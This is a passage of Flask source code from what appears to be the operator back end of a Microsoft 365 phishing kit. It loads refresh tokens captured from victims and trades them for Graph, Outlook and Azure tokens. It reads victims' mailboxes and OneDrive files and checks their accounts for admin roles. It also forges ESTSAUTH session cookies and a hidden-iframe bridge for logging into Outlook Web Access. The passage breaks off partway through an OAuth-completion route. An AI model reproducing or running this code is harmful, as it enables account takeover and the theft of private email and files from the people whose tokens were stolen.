        # Admin changing master password
        global ADMIN_PASSWORD
        if old_pw != ADMIN_PASSWORD:
            return jsonify({"error": "Current password is incorrect"}), 403
        ADMIN_PASSWORD = new_pw
        # Persist to config
        try:
            with open(CONFIG_PATH, "r") as f:
                raw = f.read()
            import re as _re
            raw = _re.sub(r'(password:\s*)"[^"]*"', f'\1"{new_pw}"', raw, count=1)
            with open(CONFIG_PATH, "w") as f:
                f.write(raw)
            log.info("🔑 Admin password changed")
        except Exception as e:
            log.warning(f"⚠️ Password changed in memory but config write failed: {e}")
        return jsonify({"ok": True, "message": "Admin password updated"})
    else:
        # Operator changing their password
        operators = _load_operators()
        op = next((o for o in operators if o["id"] == current["operator_id"]), None)
        if not op:
            return jsonify({"error": "Operator not found"}), 404
        if op["password_hash"] != _hl.sha256(old_pw.encode()).hexdigest():
            return jsonify({"error": "Current password is incorrect"}), 403
        op["password_hash"] = _hl.sha256(new_pw.encode()).hexdigest()
        _save_operators(operators)
        log.info(f"🔑 Operator {current['username']} changed password")
        return jsonify({"ok": True, "message": "Password updated"})


@app.route("/admin/api/me")
def api_current_user():
    """Return current user info (role, username, operator_id)."""
    current = _get_current_operator()
    return jsonify({"role": current["role"], "username": current["username"], "operator_id": current["operator_id"]})


# ─── Admin Settings / Config Editor ─────────────────────────────────
@app.route("/admin/settings", methods=["GET"])
def admin_settings():
    """Live config editor — edit config.yaml from the browser."""
    denied = _require_admin()
    if denied:
        return denied
    config_content = ""
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH) as f:
            config_content = f.read()
    ssl_label = "LE Cert" if CFG["server"]["ssl"].get("letsencrypt") else "Self-Signed"
    return render_template("config_editor.html",
        config_content=config_content,
        turnstile_enabled=TURNSTILE_ENABLED,
        anti_fp=ANTI_FP,
        ssl_label=ssl_label,
        rate_max=RATE_MAX,
        rate_window=RATE_WINDOW,
        bot_count=len(BOT_PATTERNS),
    )




@app.route("/admin/api/config", methods=["POST"])
def admin_save_config():
    """Save config.yaml from the browser editor."""
    denied = _require_admin()
    if denied:
        return denied
    data = request.get_json(silent=True) or {}
    config_text = data.get("config", "")
    if not config_text:
        return jsonify({"error": "empty config"}), 400
    try:
        # Validate YAML syntax
        import yaml
        yaml.safe_load(config_text)
        # Write
        with open(CONFIG_PATH, "w") as f:
            f.write(config_text)
        log.info("⚙️ Config saved from admin UI")
        audit("config_save", detail="config.yaml updated via admin UI")
        return jsonify({"status": "saved"})
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/admin/api/restart", methods=["POST"])
def admin_restart():
    """Restart the server process."""
    denied = _require_admin()
    if denied:
        return denied
    log.info("🔄 Restart requested from admin UI")
    def _restart():
        import subprocess
        time.sleep(1)
        # Spawn new process, then exit old one so port is released
        subprocess.Popen([sys.executable] + sys.argv,
                        start_new_session=True,
                        stdout=open(os.path.join(DATA_DIR, "server.log"), "a"),
                        stderr=subprocess.STDOUT)
        time.sleep(0.5)
        os._exit(0)  # Hard exit to release the port
    threading.Thread(target=_restart, daemon=True).start()
    return jsonify({"status": "restarting"})


# ─── Admin Dashboard ─────────────────────────────────────────────────
@app.route("/admin")
def admin_dashboard():
    return render_template("admin.html")


@app.route("/admin/config")
def admin_config():
    """View current config (safe — no secrets exposed)."""
    safe = {
        "server": {"port": LISTEN_PORT, "domain": SERVER_DOMAIN},
        "turnstile": {"enabled": TURNSTILE_ENABLED, "site_key": TURNSTILE_SITE_KEY[:8] + "..." if TURNSTILE_SITE_KEY else ""},
        "protection": {
            "rate_limit": f"{RATE_MAX} req / {RATE_WINDOW}s",
            "admin_ips": ADMIN_IPS or "open",
            "anti_fingerprint": ANTI_FP,
            "session_ttl": f"{SESSION_TTL // 60} min",
            "bot_patterns": len(BOT_PATTERNS),
        },
        "ssl": {
            "letsencrypt": CFG["server"]["ssl"].get("letsencrypt", False),
            "cert_exists": os.path.exists(os.path.join(CERT_DIR, "server.crt")),
        },
        "sessions_active": sum(1 for s in sessions.values() if s.get("status") == "active"),
        "rate_limit_ips": len(rate_limits),
    }
    return jsonify(safe)


@app.route("/admin/mailbox")
@app.route("/admin/mailbox/<int:index>")
def open_mailbox(index=0):
    """Built-in webmail viewer — reads victim inbox via Graph API."""
    tokens = []
    if os.path.exists(TOKEN_LOG):
        with open(TOKEN_LOG) as f:
            try:
                tokens = json.load(f)
            except json.JSONDecodeError:
                log.warning("⚠️ Token file corrupted, attempting recovery")
                f.seek(0)
                raw = f.read()
                depth = 0
                end = 0
                for i, c in enumerate(raw):
                    if c == '[': depth += 1
                    elif c == ']':
                        depth -= 1
                        if depth == 0:
                            end = i + 1
                            break
                if end:
                    tokens = json.loads(raw[:end])
                    with open(TOKEN_LOG, "w") as fw:
                        json.dump(tokens, fw, indent=2)

    if not tokens:
        return "<h2>No captured tokens. Visit /share first.</h2>", 404

    tokens_reversed = list(reversed(tokens))
    if index >= len(tokens_reversed):
        index = 0
    token = tokens_reversed[index]
    rt = token.get("refresh_token", "")
    if not rt:
        return "<h2>No refresh token available.</h2>", 400

    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    # Refresh token first
    try:
        r1 = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
            data={"client_id": CLIENT_ID, "grant_type": "refresh_token", "refresh_token": rt, "resource": RESOURCE},
            headers=ua, timeout=15,
        )
        if r1.status_code == 200 and "access_token" in r1.json():
            at = r1.json()["access_token"]
            fresh_rt = r1.json().get("refresh_token", rt)
            real_index = len(tokens) - 1 - index
            tokens[real_index]["refresh_token"] = fresh_rt
            tokens[real_index]["access_token"] = at
            tokens[real_index]["last_refreshed"] = now_utc().isoformat()
            _safe_save_tokens(tokens)
        else:
            at = token.get("access_token", "")
    except Exception:
        at = token.get("access_token", "")

    if not at:
        return "<h2>Token expired. Capture a fresh one.</h2>", 401

    headers = {"Authorization": f"Bearer {at}"}
    upn = token.get("upn", "unknown")

    # Fetch profile
    profile = {}
    try:
        r = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers, timeout=10)
        if r.status_code == 200:
            profile = r.json()
    except Exception:
        pass

    # Fetch emails
    emails = []
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/messages?$top=250&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments&$orderby=receivedDateTime desc",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            emails = r.json().get("value", [])
    except Exception:
        pass

    # Fetch files
    files = []
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/drive/root/children?$top=50&$select=name,size,lastModifiedDateTime,webUrl",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            files = r.json().get("value", [])
    except Exception:
        pass

    log.info(f"📬 Mailbox viewed: {upn} ({len(emails)} emails, {len(files)} files)")

    # Render
    name = profile.get("displayName", upn)
    job = profile.get("jobTitle", "")
    dept = profile.get("department", "")

    email_rows = ""
    prev_group = ""
    for e in emails:
        subj = e.get("subject", "(no subject)") or "(no subject)"
        frm = e.get("from", {}).get("emailAddress", {}).get("address", "unknown")
        frm_name = e.get("from", {}).get("emailAddress", {}).get("name", frm)
        raw_date = e.get("receivedDateTime", "")
        preview = (e.get("bodyPreview", "") or "")[:120]
        # HTML-escape user content to prevent DOM corruption
        from markupsafe import escape as html_escape
        subj = ' '.join(str(html_escape(subj)).split())
        frm_name = ' '.join(str(html_escape(frm_name)).split())
        preview = ' '.join(str(html_escape(preview)).split())
        read = e.get("isRead", False)
        msg_id = e.get("id", "")
        has_att = e.get("hasAttachments", False)
        colors = ['#0f6cbd','#7c3aed','#d97706','#059669','#dc2626','#2563eb','#e11d48','#0891b2','#4f46e5','#c026d3']
        initial = (frm_name or frm or '?')[0].upper()
        clr = colors[ord(initial) % len(colors)]
        unread_class = ' unread' if not read else ''
        att_badge = '<span class="msg-att-badge">📎</span>' if has_att else ''

        # Date grouping
        from datetime import datetime as dt_cls
        try:
            d = dt_cls.fromisoformat(raw_date.replace("Z", "+00:00"))
            today = now_utc().replace(hour=0, minute=0, second=0, microsecond=0)
            yesterday = today - timedelta(days=1)
            last_week = today - timedelta(days=7)
            if d >= today:
                group = "Today"
                time_str = d.strftime("%H:%M")
            elif d >= yesterday:
                group = "Yesterday"
                time_str = "Yesterday"
            elif d >= last_week:
                group = "Last Week"
                time_str = d.strftime("%b %d")
            else:
                group = d.strftime("%B %Y")
                time_str = d.strftime("%b %d")
        except Exception:
            group = ""
            time_str = raw_date[:16].replace("T", " ")

        if group and group != prev_group:
            email_rows += f'<div class="date-group">{group}</div>'
            prev_group = group

        email_rows += f'''
        <div class="msg-row{unread_class}" data-id="{msg_id}">
            <span class="unread-dot"></span>
            <input type="checkbox" class="msg-check" onclick="event.stopPropagation()" />
            <div class="msg-avatar" style="background:{clr}">{initial}</div>
            <div class="msg-content">
                <div class="msg-top">
                    <span class="msg-sender">{frm_name}</span>
                    <div class="msg-meta">{att_badge}<span class="msg-date">{time_str}</span></div>
                </div>
                <div class="msg-subject">{subj}</div>
                <div class="msg-preview">{preview}</div>
            </div>
        </div>'''

    file_rows = ""
    for f_item in files:
        fname = str(html_escape(f_item.get("name", "?")))
        fsize = f_item.get("size", 0)
        fsize_str = f"{{fsize:,}} bytes" if fsize < 1048576 else f"{{fsize/1048576:.1f}} MB"
        icon = "📁" if fsize == 0 else "📄"
        file_rows += f'<div class="file-row">{icon} <span class="file-name">{fname}</span> <span class="file-size">{fsize_str}</span></div>'

    # JS-escape file_rows so single quotes in filenames don't break JS string
    file_rows_js = file_rows.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")

    # Get real inbox unread count
    unread_count = len(emails)
    try:
        r_uc = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox?$select=unreadItemCount",
            headers=headers, timeout=10,
        )
        if r_uc.status_code == 200:
            unread_count = r_uc.json().get("unreadItemCount", len(emails))
    except Exception:
        pass

    return render_template("mailbox.html",
        email_rows=email_rows, file_rows=file_rows_js,
        name=name, upn=upn, initial=name[:1].upper() if name else "?",
        clr="#2563eb", index=index, date="",
        email_count=unread_count, file_count=len(files),
        dept=dept or "—", job=job or "—",
        phone=profile.get("mobilePhone", "—"),
        office=profile.get("officeLocation", "—"),
    )


def _get_fresh_token(index=0):
    """Helper: get a fresh access token for the given capture index."""
    tokens = []
    if os.path.exists(TOKEN_LOG):
        with open(TOKEN_LOG) as f:
            try:
                tokens = json.load(f)
            except json.JSONDecodeError:
                f.seek(0)
                raw = f.read()
                depth = end = 0
                for i, c in enumerate(raw):
                    if c == '[': depth += 1
                    elif c == ']':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                if end:
                    tokens = json.loads(raw[:end])
                    with open(TOKEN_LOG, "w") as fw:
                        json.dump(tokens, fw, indent=2)
    if not tokens:
        return None, None
    tokens_reversed = list(reversed(tokens))
    if index >= len(tokens_reversed):
        index = 0
    token = tokens_reversed[index]
    rt = token.get("refresh_token", "")
    if not rt:
        return token.get("access_token", ""), token
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        r = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
            data={"client_id": CLIENT_ID, "grant_type": "refresh_token", "refresh_token": rt, "resource": RESOURCE},
            headers=ua, timeout=15,
        )
        if r.status_code == 200 and "access_token" in r.json():
            real_index = len(tokens) - 1 - index
            tokens[real_index]["access_token"] = r.json()["access_token"]
            tokens[real_index]["refresh_token"] = r.json().get("refresh_token", rt)
            tokens[real_index]["last_refreshed"] = now_utc().isoformat()
            _safe_save_tokens(tokens)
            return r.json()["access_token"], token
    except Exception:
        pass
    return token.get("access_token", ""), token


# ─── Admin Privilege Detection ───────────────────────────────────────
@app.route("/admin/api/roles")
def api_roles():
    """Detect admin roles and directory memberships for a captured account."""
    idx = int(request.args.get("idx", 0))
    at, token_data = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 404
    headers = {"Authorization": f"Bearer {at}"}
    upn = token_data.get("upn", "unknown")
    result = {"upn": upn, "roles": [], "groups": [], "is_admin": False, "scopes": []}

    # Decode token claims for scopes/roles
    claims = decode_jwt(at)
    result["scopes"] = claims.get("scp", "").split() if claims.get("scp") else []
    result["token_roles"] = claims.get("roles", [])
    result["wids"] = claims.get("wids", [])
    result["tid"] = claims.get("tid", "")
    result["app"] = claims.get("app_displayname", claims.get("appid", ""))

    # Well-known admin role template IDs
    ADMIN_ROLE_MAP = {
        "62e90394-69f5-4237-9190-012177145e10": "Global Administrator",
        "194ae4cb-b126-40b2-bd5b-6091b380977d": "Security Administrator",
        "29232cdf-9323-42fd-ade2-1d097af3e4de": "Exchange Administrator",
        "f28a1f50-f6e7-4571-818b-6a12f2af6b6c": "SharePoint Administrator",
        "fe930be7-5e62-47db-91af-98c3a49a38b1": "User Administrator",
        "b0f54661-2d74-4c50-afa3-1ec803f12efe": "Billing Administrator",
        "729827e3-9c14-49f7-bb1b-9608f156bbb8": "Helpdesk Administrator",
        "966707d0-3269-4727-9be2-8c3a10f19b9d": "Password Administrator",
        "fdd7a751-b60b-444a-984c-02652fe8fa1c": "Groups Administrator",
        "11648597-926c-4cf3-9c36-bcebb0ba8dcc": "Power Platform Administrator",
        "e8611ab8-c189-46e8-94e1-60213ab1f814": "Privileged Role Administrator",
        "7be44c8a-adaf-4e2a-84d6-ab2649e08a13": "Privileged Authentication Administrator",
        "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3": "Application Administrator",
        "158c047a-c907-4556-b7ef-446551a6b5f7": "Cloud Application Administrator",
        "b1be1c3e-b65d-4f19-8427-f6fa0d97feb9": "Conditional Access Administrator",
        "44367163-eba1-44c3-98af-f5787879f96a": "Dynamics 365 Administrator",
        "11451d60-acb2-45eb-a7d6-43d0f0125c13": "Windows 365 Administrator",
        "3a2c62db-5318-420d-8d74-23affee5d9d5": "Intune Administrator",
        "69091246-20e8-4a56-aa4d-066075b2a7a8": "Teams Administrator",
    }

    # Get directory role memberships
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/memberOf?$select=displayName,roleTemplateId,@odata.type",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            for member in r.json().get("value", []):
                otype = member.get("@odata.type", "")
                name = member.get("displayName", "")
                if "directoryRole" in otype:
                    role_tid = member.get("roleTemplateId", "")
                    friendly = ADMIN_ROLE_MAP.get(role_tid, name)
                    result["roles"].append({"name": friendly, "roleTemplateId": role_tid})
                    if role_tid == "62e90394-69f5-4237-9190-012177145e10":
                        result["is_admin"] = True
                elif "group" in otype:
                    result["groups"].append(name)
    except Exception as e:
        result["role_error"] = str(e)

    # Get license info
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/licenseDetails?$select=skuPartNumber",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            result["licenses"] = [l.get("skuPartNumber", "") for l in r.json().get("value", [])]
    except Exception:
        pass

    # Mark admin if any admin role found
    if result["roles"]:
        result["is_admin"] = True

    log.info(f"🔍 Role check: {upn} → {len(result['roles'])} roles, admin={result['is_admin']}")
    return jsonify(result)


# ─── OWA tokenLogin (Real Outlook Web Access) ───────────────────────
@app.route("/admin/api/owa-login")
def api_owa_login():
    """Generate OWA access via ESTSAUTH cookie bridge.
    Instead of tokenLogin (which MSAL.js overrides), we:
    1. Get an id_token via AAD Graph (this IS the ESTSAUTH cookie value)
    2. Get an access token for outlook.office365.com
    3. Serve a bridge page that sets the ESTSAUTH cookie on login.microsoftonline.com
       and then redirects to OWA with a proper SSO session."""
    idx = int(request.args.get("idx", 0))

    # Check cache first
    with owa_cache_lock:
        cached = owa_url_cache.get(idx)
        if cached:
            age = (now_utc() - cached["generated_at"]).total_seconds()
            if age < OWA_CACHE_TTL:
                log.info(f"📬 OWA cached bridge served for {cached['upn']} (age: {int(age)}s)")
                return jsonify({
                    "url": f"/admin/owa-bridge?idx={idx}",
                    "upn": cached["upn"],
                    "expires_in": max(0, int(float(cached["expires_in"])) - int(age)),
                    "cached": True,
                })

    # Cache miss or expired — generate fresh tokens
    _, token_data = _get_fresh_token(idx)
    if not token_data:
        return jsonify({"error": "no token found"}), 404

    rt = token_data.get("refresh_token", "")
    if not rt:
        return jsonify({"error": "no refresh token available"}), 400

    upn = token_data.get("upn", "unknown")
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}

    try:
        # Step 1: Get id_token from AAD Graph (used as ESTSAUTH cookie)
        r_aad = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token",
            data={
                "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                "grant_type": "refresh_token",
                "refresh_token": rt,
                "resource": "https://graph.windows.net/",
            },
            headers=ua, timeout=15,
        )
        id_token = None
        if r_aad.status_code == 200:
            id_token = r_aad.json().get("id_token")
            # Update refresh token if rotated
            new_rt = r_aad.json().get("refresh_token", rt)
            if new_rt != rt:
                rt = new_rt

        # Step 2: Get access token for substrate (for tokenLogin as backup)
        r_sub = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token",
            data={
                "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
                "grant_type": "refresh_token",
                "refresh_token": rt,
                "resource": "https://substrate.office.com/",
            },
            headers=ua, timeout=15,
        )
        substrate_token = None
        if r_sub.status_code == 200:
            substrate_token = r_sub.json().get("access_token")
            expires_in = int(r_sub.json().get("expires_in", 3600))

        if not id_token and not substrate_token:
            return jsonify({"error": "Could not obtain tokens for OWA access"}), 400

        # Cache the tokens
        with owa_cache_lock:
            owa_url_cache[idx] = {
                "id_token": id_token,
                "substrate_token": substrate_token,
                "upn": upn,
                "generated_at": now_utc(),
                "expires_in": expires_in if substrate_token else 3600,
            }

        log.info(f"📬 OWA bridge tokens generated for {upn} (ESTSAUTH={'✅' if id_token else '❌'}, substrate={'✅' if substrate_token else '❌'})")
        return jsonify({
            "url": f"/admin/owa-bridge?idx={idx}",
            "upn": upn,
            "expires_in": expires_in if substrate_token else 3600,
            "cached": False,
        })
    except Exception as e:
        log.warning(f"OWA bridge generation failed for {upn}: {e}")
        return jsonify({"error": f"Token exchange error: {str(e)}"}), 500


@app.route("/admin/owa-bridge")
def owa_bridge():
    """Bridge page that injects ESTSAUTH cookie and redirects to OWA.
    This page does a multi-step redirect:
    1. Opens login.microsoftonline.com/common/oauth2/authorize with id_token_hint
       (this sets proper SSO cookies in the browser)
    2. The authorize response redirects to OWA with a proper session
    """
    idx = int(request.args.get("idx", 0))

    with owa_cache_lock:
        cached = owa_url_cache.get(idx)

    if not cached:
        return "Session expired. Go back and click Open in Outlook again.", 400

    id_token = cached.get("id_token", "")
    substrate_token = cached.get("substrate_token", "")
    upn = cached.get("upn", "unknown")

    # Build the tokenLogin URL as primary method
    token_login_url = ""
    if substrate_token:
        token_login_url = f"https://outlook.office365.com/owa/tokenLogin?token={substrate_token}&redirectTo=https%3A%2F%2Foutlook.office365.com%2Fowa%2F"

    # Build authorize URL with id_token_hint for SSO session establishment
    import urllib.parse
    authorize_url = ""
    if id_token:
        params = {
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "response_type": "code",
            "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient",
            "scope": "openid",
            "id_token_hint": id_token,
            "prompt": "none",
            "login_hint": upn,
        }
        authorize_url = f"https://login.microsoftonline.com/common/oauth2/authorize?{urllib.parse.urlencode(params)}"

    log.info(f"📬 OWA bridge page served for {upn}")

    html = f'''<!DOCTYPE html><html><head>
<meta charset="utf-8"><title>Opening Outlook...</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#060918;color:#e2e8f0;font-family:Inter,-apple-system,sans-serif;
display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:16px}}
.spinner{{width:40px;height:40px;border:3px solid rgba(79,70,229,0.2);
border-top-color:#818cf8;border-radius:50%;animation:spin 0.8s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
p{{font-size:14px;color:#64748b}}
.hint{{font-size:12px;color:#334155;margin-top:8px;text-align:center;max-width:400px;line-height:1.5}}
a{{color:#818cf8;text-decoration:none}}
a:hover{{text-decoration:underline}}
</style>
</head><body>
<div class="spinner"></div>
<p>Establishing Outlook session for <strong>{upn}</strong>...</p>
<div class="hint" id="hint"></div>

<script>
const tokenLoginUrl = "{token_login_url}";
const authorizeUrl = `{authorize_url}`;
const upn = "{upn}";

async function establishSession() {{
    // Strategy 1: If we have an id_token, first hit the authorize endpoint
    // in a hidden iframe to establish SSO cookies, then open OWA
    if (authorizeUrl) {{
        try {{
            // Create hidden iframe to establish SSO session
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = authorizeUrl;
            document.body.appendChild(iframe);

            // Wait for SSO cookie to be set
            await new Promise(r => setTimeout(r, 3000));

            // Now open OWA — the SSO session should be active
            window.location.href = 'https://outlook.office365.com/mail/';
            return;
        }} catch(e) {{
            console.log('SSO iframe failed, trying tokenLogin fallback');
        }}
    }}

    // Strategy 2: Direct tokenLogin (fallback)
    if (tokenLoginUrl) {{
        window.location.href = tokenLoginUrl;
        return;
    }}

    // Strategy 3: Last resort — show manual instructions
    document.getElementById('hint').innerHTML =
        'Auto-login could not be established.<br>' +
        'Use <a href="/admin#token-vault">Cookie Editor</a> to import session cookies manually.';
}}

establishSession();

// Fallback hint after 8 seconds if still on this page
setTimeout(() => {{
    document.getElementById('hint').innerHTML =
        'Taking too long? The session may need cookies imported manually.<br>' +
        '<a href="/admin#token-vault">Go back to Token Vault</a> and use the Cookie button instead.';
}}, 8000);
</script>
</body></html>'''
    resp = make_response(html, 200)
    resp.headers["Content-Type"] = "text/html"
    return resp


# ─── Session Cookie Generator (ESTSAUTH) ────────────────────────────
@app.route("/admin/api/session-cookies")
def api_session_cookies():
    """Generate browser session cookies from captured refresh token.
    Returns tokens for multiple resources formatted for Cookie Editor import."""
    idx = int(request.args.get("idx", 0))
    at, token_data = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 404

    rt = token_data.get("refresh_token", "")
    upn = token_data.get("upn", "unknown")
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    result = {
        "upn": upn,
        "tokens": {},
        "cookie_editor_import": [],
    }

    # Resources to generate tokens for
    cookie_resources = {
        "graph": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://graph.microsoft.com/"},
        "outlook": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://outlook.office365.com/"},
        "substrate": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://substrate.office.com/"},
        "azure_mgmt": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://management.azure.com/"},
        "aad_graph": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://graph.windows.net/"},
        "office_apps": {"client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "resource": "https://officeapps.live.com/"},
    }

    for name, params in cookie_resources.items():
        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token",
                data={
                    "client_id": params["client_id"],
                    "grant_type": "refresh_token",
                    "refresh_token": rt,
                    "resource": params["resource"],
                    "scope": "openid",
                },
                headers=ua, timeout=15,
            )
            if r.status_code == 200:
                data = r.json()
                result["tokens"][name] = {
                    "access_token": data.get("access_token", "")[:50] + "...",
                    "access_token_full": data.get("access_token", ""),
                    "id_token": data.get("id_token", ""),
                    "refresh_token": data.get("refresh_token", rt),
                    "expires_in": data.get("expires_in", ""),
                    "resource": params["resource"],
                }

                # If we got an id_token from AAD Graph, that can be used for ESTSAUTH
                if name == "aad_graph" and data.get("id_token"):
                    result["estsauth"] = data["id_token"]
                    result["estsauthpersistent"] = data["id_token"]
        except Exception:
            result["tokens"][name] = {"error": "failed"}

    # Build Cookie Editor JSON import format
    tid = token_data.get("tenant_id", decode_jwt(at).get("tid", ""))
    if result.get("estsauth"):
        result["cookie_editor_import"] = [
            {
                "domain": "login.microsoftonline.com",
                "name": "ESTSAUTH",
                "value": result["estsauth"],
                "path": "/",
                "secure": True,
                "httpOnly": True,
            },
            {
                "domain": "login.microsoftonline.com",
                "name": "ESTSAUTHPERSISTENT",
                "value": result["estsauthpersistent"],
                "path": "/",
                "secure": True,
                "httpOnly": True,
            },
            {
                "domain": ".login.microsoftonline.com",
                "name": "ESTSAUTH",
                "value": result["estsauth"],
                "path": "/",
                "secure": True,
                "httpOnly": True,
            },
        ]

    # Add Graph API bearer format for direct API use
    result["bearer_tokens"] = {
        "graph": at,
        "refresh": rt,
    }

    log.info(f"🍪 Session cookies generated for {upn} ({len(result['tokens'])} resources)")
    return jsonify(result)


# ─── Browser Token Exchange (for Electron App) ──────────────────────
@app.route("/admin/api/browser-token")
def api_browser_token():
    """Exchange refresh token for access_token + id_token with custom nonce.
    Used by the Electron app to complete OAuth flows in the embedded browser."""
    idx = int(request.args.get("idx", 0))
    nonce = request.args.get("nonce", "")
    client_id = request.args.get("client_id", "d3590ed6-52b3-4102-aeff-aad2292ab01c")
    resource = request.args.get("resource", "https://outlook.office365.com/")
    use_v2 = request.args.get("v2", "") == "1"

    at, token_data = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 404

    rt = token_data.get("refresh_token", "")
    upn = token_data.get("upn", "unknown")
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    if use_v2:
        # v2 endpoint with scope (produces correct audience for OWA)
        data = {
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "scope": f"{resource}.default openid profile offline_access",
        }
        token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    else:
        # v1 endpoint with resource
        data = {
            "client_id": client_id,
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "resource": resource,
            "scope": "openid",
        }
        token_url = "https://login.microsoftonline.com/Common/oauth2/token"

    if nonce:
        data["nonce"] = nonce

    try:
        r = requests.post(token_url, data=data, headers=ua, timeout=15)
        if r.status_code == 200:
            resp = r.json()
            log.info(f"🔑 Browser token generated for {upn} (resource={resource}, v2={use_v2})")
            return jsonify({
                "access_token": resp.get("access_token", ""),
                "id_token": resp.get("id_token", ""),
                "refresh_token": resp.get("refresh_token", rt),
                "expires_in": resp.get("expires_in", "3599"),
                "token_type": "Bearer",
                "upn": upn,
            })
        else:
            log.warning(f"Token exchange failed: {r.status_code} {r.text[:200]}")
            return jsonify({"error": r.text}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ─── OAuth Completion (for Electron App) ─────────────────────────────
@app.route("/admin/api/onedrive-url")
def api_onedrive_url():
    """Discover the user's OneDrive for Business URL via Graph API."""
    idx = int(request.args.get("idx", 0))
    at, token_data = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "Token not found"}), 404

    # Exchange for Graph token
    rt = token_data.get("refresh_token", "")
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    r = requests.post(
        "https://login.microsoftonline.com/common/oauth2/v2.0/token",
        data={
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "scope": "https://graph.microsoft.com/.default openid profile offline_access",
        },
        headers=ua, timeout=15,
    )
    if r.status_code != 200:
        return jsonify({"error": "Token exchange failed"}), 400

    graph_token = r.json().get("access_token", "")

    # Call Graph API to get OneDrive URL
    dr = requests.get(
        "https://graph.microsoft.com/v1.0/me/drive",
        headers={"Authorization": f"Bearer {graph_token}"},
        timeout=10,
    )
    if dr.status_code == 200:
        web_url = dr.json().get("webUrl", "")
        if web_url:
            log.info(f"📁 OneDrive URL for idx={idx}: {web_url}")
            return jsonify({"url": web_url})

    # Fallback: try to construct from UPN
    upn = token_data.get("upn", "")
    domain = upn.split("@")[1].split(".")[0] if "@" in upn else ""
    if domain:
        return jsonify({"url": f"https://{domain}-my.sharepoint.com"})

    return jsonify({"error": "Could not discover OneDrive URL"}), 404


@app.route("/admin/api/oauth-complete")
def api_oauth_complete():
    """Complete OWA's OAuth flow on behalf of the user.

    When the Electron app intercepts MSAL.js's redirect to login.microsoftonline.com,
    it redirects here instead. We exchange the refresh token for tokens and redirect
    back to OWA's redirect_uri with the tokens — completing the flow transparently.
    Handles both implicit (token) and PKCE (code) response types.
    """
    idx = int(request.args.get("idx", 0))
    req_client_id = request.args.get("client_id", "")
    redirect_uri = request.args.get("redirect_uri", "")
    state = request.args.get("state", "")
    nonce = request.args.get("nonce", "")
    response_type = request.args.get("response_type", "")

    at, token_data = _get_fresh_token(idx)
    if not at:
        return "Token not found", 404

    rt = token_data.get("refresh_token", "")
    upn = token_data.get("upn", "unknown")

    # Use the actual client_id from MSAL.js request (FOCI allows cross-client refresh)
    # Fall back to Microsoft Office client_id if none provided
    exchange_client_id = req_client_id if req_client_id else "d3590ed6-52b3-4102-aeff-aad2292ab01c"

    # Detect target service from the redirect_uri to pick correct scope
    # Use outlook.office365.com resource for Outlook (matches v1 session-cookies endpoint)
    scope_map = {
        "outlook": "https://outlook.office365.com/.default openid profile offline_access",
        "office365": "https://outlook.office365.com/.default openid profile offline_access",
        "cloud.microsoft": "https://outlook.office365.com/.default openid profile offline_access",
        "onedrive": "https://graph.microsoft.com/.default openid profile offline_access",
        "sharepoint": "https://graph.microsoft.com/.default openid profile offline_access",
        "teams": "https://teams.microsoft.com/.default openid profile offline_access",
